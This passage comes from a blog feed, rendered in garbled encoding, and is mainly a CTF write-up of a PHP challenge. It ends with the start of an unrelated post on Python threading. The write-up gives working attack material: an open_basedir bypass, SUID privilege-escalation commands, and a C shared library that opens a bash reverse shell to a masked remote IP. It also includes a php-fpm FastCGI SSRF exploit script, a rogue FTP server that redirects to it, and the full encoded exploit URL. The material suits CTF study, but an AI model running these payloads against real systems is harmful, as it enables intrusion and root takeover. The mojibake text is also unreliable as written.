æ¥è·å¾—æ–°çš„shellï¼š</p><hr><p>è¿™é‡Œæœ‰ç‚¹å°é—®é¢˜å°±æ˜¯ï¼Œé€šè¿‡è¿™ç§æ–¹å¼æ³¨å…¥æ–°çš„shellåï¼Œæƒé™ç»„ç›´æ¥æˆä¸ºäº†rootï¼Œå¯¼è‡´æ ¹ç›®å½•ä¸‹flagæ–‡ä»¶å¯ä»¥ç›´æ¥è¢«è¯»å–ã€‚è€Œé¢„æœŸæ˜¯éœ€è¦suidææƒã€‚æ‰€ä»¥è¿™é‡Œå¯¹suidææƒè¿›è¡Œä¸€äº›äº†è§£</p><h3 id="suidææƒ"><a href="#suidææƒ" class="headerlink" title="suidææƒ"></a>suidææƒ</h3><p>å‚è€ƒæ–‡ç« :</p><ul><li><a href="https://blog.csdn.net/qq_36119192/article/details/84872644">https://blog.csdn.net/qq_36119192/article/details/84872644</a></li><li><a href="https://www.anquanke.com/post/id/86979">https://www.anquanke.com/post/id/86979</a></li><li><a href="https://www.leavesongs.com/PENETRATION/linux-suid-privilege-escalation.html">https://www.leavesongs.com/PENETRATION/linux-suid-privilege-escalation.html</a></li></ul><p>ä¸»è¦å°±æ˜¯å…ˆç”¨å‘½ä»¤çœ‹æœ‰rootæƒé™çš„åº”ç”¨</p><pre><code class="shell">#ä»¥ä¸‹å‘½ä»¤å°†å°è¯•æŸ¥æ‰¾å…·æœ‰rootæƒé™çš„SUIDçš„æ–‡ä»¶ï¼Œä¸åŒç³»ç»Ÿé€‚ç”¨äºä¸åŒçš„å‘½ä»¤ï¼Œä¸€ä¸ªä¸€ä¸ªè¯•find / -perm -u=s -type f 2&gt;/dev/nullfind / -user root -permÂ -4000-print2&gt;/dev/nullfind / -user root -permÂ -4000-exec ls -ldb &#123;&#125; \;</code></pre><p>åœ¨æœ¬é¢˜ä¸­ä½¿ç”¨ç¬¬ä¸€ç§ã€‚</p><p><img src="/2021/05/23/%E4%B8%80%E9%81%93php%E9%A2%98%E7%9B%AE%E7%9A%84%E5%A4%8D%E7%8E%B0/20210504002727.png" alt="20210504002727"></p><p>æ‰€ä»¥ç›´æ¥å¯ä»¥è¿›å…¥ php -aè¿›å…¥äº¤äº’å¼æ‰§è¡Œç•Œé¢</p><p>ï¼Œå†æ‰§è¡Œä¹‹å‰çš„open_basedirç»•è¿‡å³å¯è¯»å–flag</p><pre><code class="php">mkdir(&#39;css&#39;);chdir(&#39;css&#39;);ini_set(&#39;open_basedir&#39;,&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);ini_set(&#39;open_basedir&#39;,&#39;/&#39;);echo file_get_contents(&#39;/flag&#39;);</code></pre><h3 id="php-fpm"><a href="#php-fpm" class="headerlink" title="php-fpm"></a>php-fpm</h3><ul><li>å„ç§bypass disable function <a href="https://cloud.tencent.com/developer/article/1806154">https://cloud.tencent.com/developer/article/1806154</a></li><li>php-fpmè®²è§£  <a href="https://www.leavesongs.com/PENETRATION/fastcgi-and-php-fpm.html">https://www.leavesongs.com/PENETRATION/fastcgi-and-php-fpm.html</a></li><li>æµ…æ php-fpmæ”»å‡»æ–¹å¼ <a href="https://xz.aliyun.com/t/5598">https://xz.aliyun.com/t/5598</a></li></ul><p>open_basedir=/www/wwwroot/106.15.74.181/:/tmp/:/proc/</p><p>è¿™é‡Œæˆ‘æœ¬æ¥æ‰“ç®—æ‹¿æˆ‘é˜¿é‡Œäº‘å­¦ç”Ÿæœºè¯•è¯•æ°´ã€‚å› ä¸ºå­¦ç”Ÿæœºå®‰è£…äº†å®å¡”ï¼Œæä¾›å•†æ˜¯é˜¿é‡Œäº‘ã€‚ä½†æ˜¯è¿™é‡Œé‡åˆ°ä¸€ä¸ªå‘ï¼Œèšå‰‘è¿é©¬æˆåŠŸï¼Œä½†æ˜¯æ‰§è¡Œå‡ æ¬¡å‘½ä»¤åä¾¿ä¼šæç¤ºconnection resetã€‚åŒæ—¶ç½‘ç«™ä¹Ÿæ— æ³•è®¿é—®äº†ï¼Œä½†æ˜¯sshæ­£å¸¸å¯ç”¨ã€‚ä¸Šç½‘æŸ¥äº†ä¸€ä¸‹ï¼Œæœ‰äººé‡åˆ°è¿‡ä¸€æ ·çš„é—®é¢˜ï¼Œç°åœ¨è¿˜ä¸çŸ¥é“æ˜¯é˜¿é‡Œäº‘è¿˜æ˜¯å®å¡”çš„é”…ã€‚æˆ‘çœ‹äº†ä¸‹åå°log</p><p><img src="/2021/05/23/%E4%B8%80%E9%81%93php%E9%A2%98%E7%9B%AE%E7%9A%84%E5%A4%8D%E7%8E%B0/image-20210523044630452.png" alt="image-20210523044630452"></p><p>å¾ˆæ˜¾ç„¶ï¼Œèšå‰‘å±…ç„¶è¿UAéƒ½æ²¡æ”¹ã€‚æ®è¯´æ˜¯åŠ¨æ€æµé‡åˆ†ææŸ¥æ€ï¼Œä¹Ÿä¸çŸ¥é“æ˜¯é˜¿é‡Œäº‘æçš„é¬¼è¿˜æ˜¯å®å¡”çš„é—®é¢˜ã€‚</p><h2 id="é¢„æœŸè§£å¤ç°"><a href="#é¢„æœŸè§£å¤ç°" class="headerlink" title="é¢„æœŸè§£å¤ç°"></a>é¢„æœŸè§£å¤ç°</h2><p>åˆ©ç”¨php-fpm ssrfæ‰§è¡Œæ¶æ„soå¼¹shellåç”¨suidææƒã€‚</p><pre><code class="c">#define _GNU_SOURCE#include &lt;stdlib.h&gt;#include &lt;stdio.h&gt;#include &lt;string.h&gt;__attribute__ ((__constructor__)) void preload (void)&#123;    system(&quot;bash -c &#39;bash -i &gt;&amp; /dev/tcp/xx.xxx.xxx.xx/2333 0&gt;&amp;1&#39;&quot;);&#125;</code></pre><p>ç¼–è¯‘</p><pre><code class="shell">gcc hpdoger.c -fPIC -shared -o hpdoger.so</code></pre><p>é€šè¿‡ç»•è¿‡open_basediré™åˆ¶ï¼Œä»æˆ‘ä»¬æœåŠ¡å™¨ä¸‹è½½æ¶æ„æ–‡ä»¶åˆ°/tmpç›®å½•</p><pre><code>/add_api.php?backdoor=mkdir(&#39;css&#39;);chdir(&#39;css&#39;);ini_set(&#39;open_basedir&#39;,&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);ini_set(&#39;open_basedir&#39;,&#39;/&#39;);copy(&#39;http://XX.xxx.xxx.XX:XXXX/hpdoger.so&#39;,&#39;/tmp/hpdoger.so&#39;);</code></pre><p>ä½¿ç”¨ä»¥ä¸‹è„šæœ¬æ„é€ ssrfæ”»å‡»</p><pre><code class="php">&lt;?php/** * Note : Code is released under the GNU LGPL * * Please do not change the header of this file * * This library is free software; you can redistribute it and/or modify it under the terms of the GNU * Lesser General Public License as published by the Free Software Foundation; either version 2 of * the License, or (at your option) any later version. * * This library is distributed in the hope that it will be useful, but WITHOUT ANY WARRANTY; * without even the implied warranty of MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. * * See the GNU Lesser General Public License for more details. *//** * Handles communication with a FastCGI application * * @author      Pierrick Charron &lt;pierrick@webstart.fr&gt; * @version     1.0 */class FCGIClient&#123;    const VERSION_1            = 1;    const BEGIN_REQUEST        = 1;    const ABORT_REQUEST        = 2;    const END_REQUEST          = 3;    const PARAMS               = 4;    const STDIN                = 5;    const STDOUT               = 6;    const STDERR               = 7;    const DATA                 = 8;    const GET_VALUES           = 9;    const GET_VALUES_RESULT    = 10;    const UNKNOWN_TYPE         = 11;    const MAXTYPE              = self::UNKNOWN_TYPE;    const RESPONDER            = 1;    const AUTHORIZER           = 2;    const FILTER               = 3;    const REQUEST_COMPLETE     = 0;    const CANT_MPX_CONN        = 1;    const OVERLOADED           = 2;    const UNKNOWN_ROLE         = 3;    const MAX_CONNS            = &#39;MAX_CONNS&#39;;    const MAX_REQS             = &#39;MAX_REQS&#39;;    const MPXS_CONNS           = &#39;MPXS_CONNS&#39;;    const HEADER_LEN           = 8;    /**     * Socket     * @var Resource     */    private $_sock = null;    /**     * Host     * @var String     */    private $_host = null;    /**     * Port     * @var Integer     */    private $_port = null;    /**     * Keep Alive     * @var Boolean     */    private $_keepAlive = false;    /**     * Constructor     *     * @param String $host Host of the FastCGI application     * @param Integer $port Port of the FastCGI application     */    public function __construct($host, $port = 9001) // and default value for port, just for unixdomain socket    &#123;        $this-&gt;_host = $host;        $this-&gt;_port = $port;    &#125;    /**     * Define whether or not the FastCGI application should keep the connection     * alive at the end of a request     *     * @param Boolean $b true if the connection should stay alive, false otherwise     */    public function setKeepAlive($b)    &#123;        $this-&gt;_keepAlive = (boolean)$b;        if (!$this-&gt;_keepAlive &amp;&amp; $this-&gt;_sock) &#123;            fclose($this-&gt;_sock);        &#125;    &#125;    /**     * Get the keep alive status     *     * @return Boolean true if the connection should stay alive, false otherwise     */    public function getKeepAlive()    &#123;        return $this-&gt;_keepAlive;    &#125;    /**     * Create a connection to the FastCGI application     */    private function connect()    &#123;        if (!$this-&gt;_sock) &#123;            //$this-&gt;_sock = fsockopen($this-&gt;_host, $this-&gt;_port, $errno, $errstr, 5);            $this-&gt;_sock = stream_socket_client($this-&gt;_host, $errno, $errstr, 5);            if (!$this-&gt;_sock) &#123;                throw new Exception(&#39;Unable to connect to FastCGI application&#39;);            &#125;        &#125;    &#125;    /**     * Build a FastCGI packet     *     * @param Integer $type Type of the packet     * @param String $content Content of the packet     * @param Integer $requestId RequestId     */    private function buildPacket($type, $content, $requestId = 1)    &#123;        $clen = strlen($content);        return chr(self::VERSION_1)         /* version */            . chr($type)                    /* type */            . chr(($requestId &gt;&gt; 8) &amp; 0xFF) /* requestIdB1 */            . chr($requestId &amp; 0xFF)        /* requestIdB0 */            . chr(($clen &gt;&gt; 8 ) &amp; 0xFF)     /* contentLengthB1 */            . chr($clen &amp; 0xFF)             /* contentLengthB0 */            . chr(0)                        /* paddingLength */            . chr(0)                        /* reserved */            . $content;                     /* content */    &#125;    /**     * Build an FastCGI Name value pair     *     * @param String $name Name     * @param String $value Value     * @return String FastCGI Name value pair     */    private function buildNvpair($name, $value)    &#123;        $nlen = strlen($name);        $vlen = strlen($value);        if ($nlen &lt; 128) &#123;            /* nameLengthB0 */            $nvpair = chr($nlen);        &#125; else &#123;            /* nameLengthB3 &amp; nameLengthB2 &amp; nameLengthB1 &amp; nameLengthB0 */            $nvpair = chr(($nlen &gt;&gt; 24) | 0x80) . chr(($nlen &gt;&gt; 16) &amp; 0xFF) . chr(($nlen &gt;&gt; 8) &amp; 0xFF) . chr($nlen &amp; 0xFF);        &#125;        if ($vlen &lt; 128) &#123;            /* valueLengthB0 */            $nvpair .= chr($vlen);        &#125; else &#123;            /* valueLengthB3 &amp; valueLengthB2 &amp; valueLengthB1 &amp; valueLengthB0 */            $nvpair .= chr(($vlen &gt;&gt; 24) | 0x80) . chr(($vlen &gt;&gt; 16) &amp; 0xFF) . chr(($vlen &gt;&gt; 8) &amp; 0xFF) . chr($vlen &amp; 0xFF);        &#125;        /* nameData &amp; valueData */        return $nvpair . $name . $value;    &#125;    /**     * Read a set of FastCGI Name value pairs     *     * @param String $data Data containing the set of FastCGI NVPair     * @return array of NVPair     */    private function readNvpair($data, $length = null)    &#123;        $array = array();        if ($length === null) &#123;            $length = strlen($data);        &#125;        $p = 0;        while ($p != $length) &#123;            $nlen = ord($data&#123;$p++&#125;);            if ($nlen &gt;= 128) &#123;                $nlen = ($nlen &amp; 0x7F &lt;&lt; 24);                $nlen |= (ord($data&#123;$p++&#125;) &lt;&lt; 16);                $nlen |= (ord($data&#123;$p++&#125;) &lt;&lt; 8);                $nlen |= (ord($data&#123;$p++&#125;));            &#125;            $vlen = ord($data&#123;$p++&#125;);            if ($vlen &gt;= 128) &#123;                $vlen = ($nlen &amp; 0x7F &lt;&lt; 24);                $vlen |= (ord($data&#123;$p++&#125;) &lt;&lt; 16);                $vlen |= (ord($data&#123;$p++&#125;) &lt;&lt; 8);                $vlen |= (ord($data&#123;$p++&#125;));            &#125;            $array[substr($data, $p, $nlen)] = substr($data, $p+$nlen, $vlen);            $p += ($nlen + $vlen);        &#125;        return $array;    &#125;    /**     * Decode a FastCGI Packet     *     * @param String $data String containing all the packet     * @return array     */    private function decodePacketHeader($data)    &#123;        $ret = array();        $ret[&#39;version&#39;]       = ord($data&#123;0&#125;);        $ret[&#39;type&#39;]          = ord($data&#123;1&#125;);        $ret[&#39;requestId&#39;]     = (ord($data&#123;2&#125;) &lt;&lt; 8) + ord($data&#123;3&#125;);        $ret[&#39;contentLength&#39;] = (ord($data&#123;4&#125;) &lt;&lt; 8) + ord($data&#123;5&#125;);        $ret[&#39;paddingLength&#39;] = ord($data&#123;6&#125;);        $ret[&#39;reserved&#39;]      = ord($data&#123;7&#125;);        return $ret;    &#125;    /**     * Read a FastCGI Packet     *     * @return array     */    private function readPacket()    &#123;        if ($packet = fread($this-&gt;_sock, self::HEADER_LEN)) &#123;            $resp = $this-&gt;decodePacketHeader($packet);            $resp[&#39;content&#39;] = &#39;&#39;;            if ($resp[&#39;contentLength&#39;]) &#123;                $len  = $resp[&#39;contentLength&#39;];                while ($len &amp;&amp; $buf=fread($this-&gt;_sock, $len)) &#123;                    $len -= strlen($buf);                    $resp[&#39;content&#39;] .= $buf;                &#125;            &#125;            if ($resp[&#39;paddingLength&#39;]) &#123;                $buf=fread($this-&gt;_sock, $resp[&#39;paddingLength&#39;]);            &#125;            return $resp;        &#125; else &#123;            return false;        &#125;    &#125;    /**     * Get Informations on the FastCGI application     *     * @param array $requestedInfo information to retrieve     * @return array     */    public function getValues(array $requestedInfo)    &#123;        $this-&gt;connect();        $request = &#39;&#39;;        foreach ($requestedInfo as $info) &#123;            $request .= $this-&gt;buildNvpair($info, &#39;&#39;);        &#125;        fwrite($this-&gt;_sock, $this-&gt;buildPacket(self::GET_VALUES, $request, 0));        $resp = $this-&gt;readPacket();        if ($resp[&#39;type&#39;] == self::GET_VALUES_RESULT) &#123;            return $this-&gt;readNvpair($resp[&#39;content&#39;], $resp[&#39;length&#39;]);        &#125; else &#123;            throw new Exception(&#39;Unexpected response type, expecting GET_VALUES_RESULT&#39;);        &#125;    &#125;    /**     * Execute a request to the FastCGI application     *     * @param array $params Array of parameters     * @param String $stdin Content     * @return String     */    public function request(array $params, $stdin)    &#123;        $response = &#39;&#39;;//        $this-&gt;connect();        $request = $this-&gt;buildPacket(self::BEGIN_REQUEST, chr(0) . chr(self::RESPONDER) . chr((int) $this-&gt;_keepAlive) . str_repeat(chr(0), 5));        $paramsRequest = &#39;&#39;;        foreach ($params as $key =&gt; $value) &#123;            $paramsRequest .= $this-&gt;buildNvpair($key, $value);        &#125;        if ($paramsRequest) &#123;            $request .= $this-&gt;buildPacket(self::PARAMS, $paramsRequest);        &#125;        $request .= $this-&gt;buildPacket(self::PARAMS, &#39;&#39;);        if ($stdin) &#123;            $request .= $this-&gt;buildPacket(self::STDIN, $stdin);        &#125;        $request .= $this-&gt;buildPacket(self::STDIN, &#39;&#39;);        echo(&#39;data=&#39;.urlencode($request));//        fwrite($this-&gt;_sock, $request);//        do &#123;//            $resp = $this-&gt;readPacket();//            if ($resp[&#39;type&#39;] == self::STDOUT || $resp[&#39;type&#39;] == self::STDERR) &#123;//                $response .= $resp[&#39;content&#39;];//            &#125;//        &#125; while ($resp &amp;&amp; $resp[&#39;type&#39;] != self::END_REQUEST);//        var_dump($resp);//        if (!is_array($resp)) &#123;//            throw new Exception(&#39;Bad request&#39;);//        &#125;//        switch (ord($resp[&#39;content&#39;]&#123;4&#125;)) &#123;//            case self::CANT_MPX_CONN://                throw new Exception(&#39;This app can\&#39;t multiplex [CANT_MPX_CONN]&#39;);//                break;//            case self::OVERLOADED://                throw new Exception(&#39;New request rejected; too busy [OVERLOADED]&#39;);//                break;//            case self::UNKNOWN_ROLE://                throw new Exception(&#39;Role value not known [UNKNOWN_ROLE]&#39;);//                break;//            case self::REQUEST_COMPLETE://                return $response;//        &#125;    &#125;&#125;?&gt;&lt;?php// real exploit start here//if (!isset($_REQUEST[&#39;cmd&#39;])) &#123;//    die(&quot;Check your input\n&quot;);//&#125;//if (!isset($_REQUEST[&#39;filepath&#39;])) &#123;//    $filepath = __FILE__;//&#125;else&#123;//    $filepath = $_REQUEST[&#39;filepath&#39;];//&#125;$filepath = &quot;/var/www/html/add_api.php&quot;;    // ç›®æ ‡ä¸»æœºå·²çŸ¥çš„PHPæ–‡ä»¶çš„è·¯å¾„$req = &#39;/&#39;.basename($filepath);$uri = $req .&#39;?&#39;.&#39;command=whoami&#39;;    // å•¥ä¹Ÿä¸æ˜¯, ä¸ç”¨ç®¡$client = new FCGIClient(&quot;unix:///var/run/php-fpm.sock&quot;, -1);$code = &quot;&lt;?php system(\$_REQUEST[&#39;command&#39;]); phpinfo(); ?&gt;&quot;;    // å•¥ä¹Ÿä¸æ˜¯, ä¸ç”¨ç®¡$php_value = &quot;unserialize_callback_func = system\nextension_dir = /tmp\nextension = hpdoger.so\ndisable_classes = \ndisable_functions = \nallow_url_include = On\nopen_basedir = /\nauto_prepend_file = &quot;;$params = array(    &#39;GATEWAY_INTERFACE&#39; =&gt; &#39;FastCGI/1.0&#39;,    &#39;REQUEST_METHOD&#39;    =&gt; &#39;POST&#39;,    &#39;SCRIPT_FILENAME&#39;   =&gt; $filepath,    &#39;SCRIPT_NAME&#39;       =&gt; $req,    &#39;QUERY_STRING&#39;      =&gt; &#39;command=whoami&#39;,    &#39;REQUEST_URI&#39;       =&gt; $uri,    &#39;DOCUMENT_URI&#39;      =&gt; $req,#&#39;DOCUMENT_ROOT&#39;     =&gt; &#39;/&#39;,    &#39;PHP_VALUE&#39;         =&gt; $php_value,    &#39;SERVER_SOFTWARE&#39;   =&gt; &#39;80sec/wofeiwo&#39;,    &#39;REMOTE_ADDR&#39;       =&gt; &#39;127.0.0.1&#39;,    &#39;REMOTE_PORT&#39;       =&gt; &#39;9001&#39;,    &#39;SERVER_ADDR&#39;       =&gt; &#39;127.0.0.1&#39;,    &#39;SERVER_PORT&#39;       =&gt; &#39;80&#39;,    &#39;SERVER_NAME&#39;       =&gt; &#39;localhost&#39;,    &#39;SERVER_PROTOCOL&#39;   =&gt; &#39;HTTP/1.1&#39;,    &#39;CONTENT_LENGTH&#39;    =&gt; strlen($code));// print_r($_REQUEST);// print_r($params);//echo &quot;Call: $uri\n\n&quot;;echo $client-&gt;request($params, $code).&quot;\n&quot;;?&gt;</code></pre><p><img src="/2021/05/23/%E4%B8%80%E9%81%93php%E9%A2%98%E7%9B%AE%E7%9A%84%E5%A4%8D%E7%8E%B0/image-20210523052724819.png" alt="image-20210523052724819"></p><p>ç„¶åå†è‡ªå·±vpsæ­å»ºä¸€ä¸ªftpæœåŠ¡å™¨</p><pre><code class="python">import sockets = socket.socket(socket.AF_INET, socket.SOCK_STREAM) s.bind((&#39;0.0.0.0&#39;, 23))s.listen(1)conn, addr = s.accept()conn.send(b&#39;220 welcome\n&#39;)#Service ready for new user.#Client send anonymous username#USER anonymousconn.send(b&#39;331 Please specify the password.\n&#39;)#User name okay, need password.#Client send anonymous password.#PASS anonymousconn.send(b&#39;230 Login successful.\n&#39;)#User logged in, proceed. Logged out if appropriate.#TYPE Iconn.send(b&#39;200 Switching to Binary mode.\n&#39;)#Size /conn.send(b&#39;550 Could not get the file size.\n&#39;)#EPSV (1)conn.send(b&#39;150 ok\n&#39;)#PASVconn.send(b&#39;227 Entering Extended Passive Mode (127,0,0,1,0,9001)\n&#39;) #&lt;&lt;--é‡å®šå‘å½¢æˆssrf--&gt;&gt;conn.send(b&#39;150 Permission denied.\n&#39;)#QUITconn.send(b&#39;221 Goodbye.\n&#39;)conn.close()</code></pre><p>å†åœ¨vpsç”¨ncèµ·ä¸ªç›‘å¬ç”¨æ¥æ¥æ”¶åå¼¹shell <code>nc -lvp 2333</code></p><p>è®¿é—®<code>?backdoor=$file%20=%20$_GET[%27file%27];$data%20=%20$_GET[%27data%27];file_put_contents($file,$data);&amp;file=ftp://aaa@106.15.74.181:23/123&amp;data=%01%01%00%01%00%08%00%00%00%01%00%00%00%00%00%00%01%04%00%01%02%3F%00%00%11%0BGATEWAY_INTERFACEFastCGI%2F1.0%0E%04REQUEST_METHODPOST%0F%19SCRIPT_FILENAME%2Fvar%2Fwww%2Fhtml%2Fadd_api.php%0B%0CSCRIPT_NAME%2Fadd_api.php%0C%0EQUERY_STRINGcommand%3Dwhoami%0B%1BREQUEST_URI%2Fadd_api.php%3Fcommand%3Dwhoami%0C%0CDOCUMENT_URI%2Fadd_api.php%09%80%00%00%B3PHP_VALUEunserialize_callback_func+%3D+system%0Aextension_dir+%3D+%2Ftmp%0Aextension+%3D+hpdoger.so%0Adisable_classes+%3D+%0Adisable_functions+%3D+%0Aallow_url_include+%3D+On%0Aopen_basedir+%3D+%2F%0Aauto_prepend_file+%3D+%0F%0DSERVER_SOFTWARE80sec%2Fwofeiwo%0B%09REMOTE_ADDR127.0.0.1%0B%04REMOTE_PORT9000%0B%09SERVER_ADDR127.0.0.1%0B%02SERVER_PORT80%0B%09SERVER_NAMElocalhost%0F%08SERVER_PROTOCOLHTTP%2F1.1%0E%02CONTENT_LENGTH49%01%04%00%01%00%00%00%00%01%05%00%01%001%00%00%3C%3Fphp+system%28%24_REQUEST%5B%27command%27%5D%29%3B+phpinfo%28%29%3B+%3F%3E%01%05%00%01%00%00%00%00</code>å³å¯è§¦å‘php-fpm ssrfå¼¹shell</p><p><img src="/2021/05/23/%E4%B8%80%E9%81%93php%E9%A2%98%E7%9B%AE%E7%9A%84%E5%A4%8D%E7%8E%B0/image-20210523052953633.png" alt="image-20210523052953633"></p><p>å¯ä»¥çœ‹åˆ°è¿˜æ˜¯æ²¡æƒé™å»è¯»ï¼Œé‚£ä¹ˆæ¥ä¸‹æ¥å°±è¦ç”¨åˆ°é¢˜ç›®hintç»™å‡ºçš„suidææƒã€‚</p><p>æ‰§è¡Œ</p><pre><code class="shell">find / -perm -u=s -type f 2&gt;/dev/null</code></pre><p>æ­¤å¤„é‡åˆ°äº†ä¸€äº›å¥‡æ€ªçš„å°bugæ¯”å¦‚</p><p><img src="/2021/05/23/%E4%B8%80%E9%81%93php%E9%A2%98%E7%9B%AE%E7%9A%84%E5%A4%8D%E7%8E%B0/image-20210523054131560.png" alt="image-20210523054131560"></p><p>æŸ¥çœ‹å…·æœ‰rootæƒé™çš„æ–‡ä»¶ï¼Œå‘ç°phpæ­£å¥½æœ‰ã€‚åœ¨open_basedirç›®å½•ä¸‹å¯åŠ¨<code>php -a</code>å†æ‰§è¡Œpayload</p><pre><code class="php">mkdir(&#39;css&#39;);chdir(&#39;css&#39;);ini_set(&#39;open_basedir&#39;,&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);ini_set(&#39;open_basedir&#39;,&#39;/&#39;);echo file_get_contents(&#39;/flag&#39;);</code></pre><p><img src="/2021/05/23/%E4%B8%80%E9%81%93php%E9%A2%98%E7%9B%AE%E7%9A%84%E5%A4%8D%E7%8E%B0/image-20210523053930342.png" alt="image-20210523053930342"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;å‰è¨€&quot;&gt;&lt;a href=&quot;#å‰è¨€&quot; class=&quot;headerlink&quot; title=&quot;å‰è¨€&quot;&gt;&lt;/a&gt;å‰è¨€&lt;/h2&gt;&lt;p&gt;å½“æ—¶2021è“å¸½æ¯æœ‰é“phpè¿˜æŒºæœ‰æ„æ€ï¼Œä¾¿æŠ½ç©ºå¤ç°ä¸€ä¸‹ã€‚æ„Ÿè§‰å­¦åˆ°å¾ˆå¤šè‡ªå·±ä»¥å‰æ²¡æŒæ¡çš„çŸ¥è¯†ç‚¹&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;suidææƒ&lt;/li&gt;</summary>
      
    
    
    
    <category term="CTFå­¦ä¹ " scheme="https://zwh-china.github.io/categories/CTF%E5%AD%A6%E4%B9%A0/"/>
    
    
  </entry>
  
  <entry>
    <title>pythonå¹¶è¡Œ2</title>
    <link href="https://zwh-china.github.io/2021/05/14/python%E5%B9%B6%E8%A1%8C2/"/>
    <id>https://zwh-china.github.io/2021/05/14/python%E5%B9%B6%E8%A1%8C2/</id>
    <published>2021-05-14T12:56:29.000Z</published>
    <updated>2021-05-14T12:39:58.000Z</updated>
    
    <content type="html"><![CDATA[<h3 id="2-1-ä»€ä¹ˆæ˜¯çº¿ç¨‹"><a href="#2-1-ä»€ä¹ˆæ˜¯çº¿ç¨‹" class="headerlink" title="2-1 ä»€ä¹ˆæ˜¯çº¿ç¨‹"></a>2-1 ä»€ä¹ˆæ˜¯çº¿ç¨‹</h3><p>åšå®¢ä¹‹å‰æœ‰ç¯‡æ–‡ç« æµ…æ˜¾çš„è®²äº†ä¸€ä¸‹çº¿ç¨‹æ˜¯å•¥ï¼Œå¯ä»¥å‚è€ƒå¾€æœŸã€‚è¿™é‡Œä¸åšè¿‡å¤šèµ˜è¿°ã€‚çº¿ç¨‹ç”±ä¸‰ä¸ªå…ƒç´ ç»„æˆï¼šç¨‹åºè®¡æ•°å™¨ã€å¯„å­˜å™¨å’Œå †æ ˆã€‚ä¸ç›¸åŒè¿›ç¨‹ä¸­çš„å…¶ä»–çº¿ç¨‹å…±äº«çš„èµ„æºåŸºæœ¬ä¸ŠåŒ…æ‹¬æ•°æ®å’Œæ“ä½œç³»ç»Ÿèµ„æºã€‚å¦å¤–çº¿ç¨‹æœ‰è‡ªå·±çš„æ‰§è¡ŒçŠ¶æ€ä¹Ÿå°±æ˜¯çº¿ç¨‹çŠ¶æ€ï¼Œè€Œä¸”å¯ä»¥å’Œå…¶ä»–çº¿ç¨‹åŒæ­¥ã€‚</p><p>çº¿ç¨‹çŠ¶æ€å¯ä»¥æ˜¯å°±ç»ªï¼Œè¿è¡Œå’Œé˜»å¡ã€‚</p><ul><li><p>åˆ›å»ºä¸€ä¸ªçº¿ç¨‹ï¼Œä»–ä¼šè¿›å…¥å°±ç»ªçŠ¶æ€ï¼ˆ readyï¼‰</p></li><li><p>ç”±æ“ä½œç³»ç»Ÿï¼ˆæˆ–è€…æœ‰è¿è¡Œæ—¶æ”¯æŒç³»ç»Ÿï¼‰è°ƒåº¦ä¸€ä¸ªçº¿ç¨‹æ‰§è¡Œè€Œä¸”è½®åˆ°å®ƒæ‰§è¡Œæ—¶ï¼Œå®ƒå¼€å§‹æ‰§è¡Œå¹¶è¿›å…¥è¿è¡ŒçŠ¶æ€ï¼ˆrunningï¼‰</p></li><li><p>çº¿ç¨‹åœ¨ç­‰å¾…ä¸€ä¸ªæ¡ä»¶æ—¶ä¼šè¿›å…¥é˜»å¡çŠ¶æ€ï¼ˆblockedï¼‰ä¾‹å¦‚å»ç­‰ä¸€ä¸ªé”ã€‚å½“é˜»å¡æ¡ä»¶ä¸­æ­¢ï¼Œé˜»å¡çº¿ç¨‹å°±ä¼šè¿”å›åˆ°å°±ç»ªçŠ¶æ€</p></li></ul><p><img src="/2021/05/14/python%E5%B9%B6%E8%A1%8C2/image-20210419204639110.png" alt="image-20210419204639110"></p><p>å¤šçº¿ç¨‹ç¼–ç¨‹çš„ä¼˜ç‚¹ä¸»è¦åœ¨æ€§èƒ½ï¼Œåœ¨ä¸Šä¸‹æ–‡åˆ‡æ¢ä¸Šè¿›ç¨‹åˆ‡æ¢æ›´è€—æ—¶ã€‚</p><h2 id="2-2-Python-Threadingæ¨¡å—"><a href="#2-2-Python-Threadingæ¨¡å—" class="headerlink" title="2-2 Python Threadingæ¨¡å—"></a>2-2 Python Threadingæ¨¡å—</h2><p>è¯¦è§<a href="https://docs.python.org/3/library/threading.html">https://docs.python.org/3/library/threading.html</a></p><h2 id="2-3-å®šä¹‰ä¸€ä¸ªçº¿ç¨‹"><a href="#2-3-å®šä¹‰ä¸€ä¸ªçº¿ç¨‹" class="headerlink" title="2-3 å®šä¹‰ä¸€ä¸ªçº¿ç¨‹"></a>2-3 å®šä¹‰ä¸€ä¸ªçº¿ç¨‹</h2><p>æœ‰æ‰‹å°±è¡Œï¼ˆç•¥ç•¥ç•¥ï¼‰</p><h3 id="2-4-ç¡®å®šå½“å‰çº¿ç¨‹"><a href="#2-4-ç¡®å®šå½“å‰çº¿ç¨‹" class="headerlink" title="2-4 ç¡®å®šå½“å‰çº¿ç¨‹"></a>2-4 ç¡®å®šå½“å‰çº¿ç¨‹</h3><p>ä½¿ç”¨å‚æ•°æ ‡è¯†å’Œå‘½åçº¿ç¨‹æ˜¯å¾ˆéº»çƒ¦çš„ã€‚åœ¨Threadå®ä¾‹åŒ–ï¼ˆåˆ›å»ºï¼‰çš„æ—¶å€™å¯ä»¥è®¾ç½®ï¼Œä¸è®¾ç½®å°±æ˜¯é»˜è®¤å€¼ã€‚Tip.å¯¹äºæœåŠ¡å™¨è¿›ç¨‹ï¼ˆåŒ…å«å¤šä¸ªçº¿ç¨‹ï¼‰ï¼Œå¯¹çº¿ç¨‹å‘½åæ—¶æ¯”è¾ƒå¿…è¦çš„</p><h3 id="2-4-1-å…·ä½“å‡½æ•°"><a href="#2-4-1-å…·ä½“å‡½æ•°" class="headerlink" title="2-4-1 å…·ä½“å‡½æ•°"></a>2-4-1 å…·ä½“å‡½æ•°</h3><p>threadingæä¾›äº†currentThread().getName()æ–¹æ³•æ¥è¿”å›çº¿ç¨‹å</p><h2 id="2-5-å®šä¹‰çº¿ç¨‹å­ç±»"><a href="#2-5-å®šä¹‰çº¿ç¨‹å­ç±»" class="headerlink" title="2-5 å®šä¹‰çº¿ç¨‹å­ç±»"></a>2-5 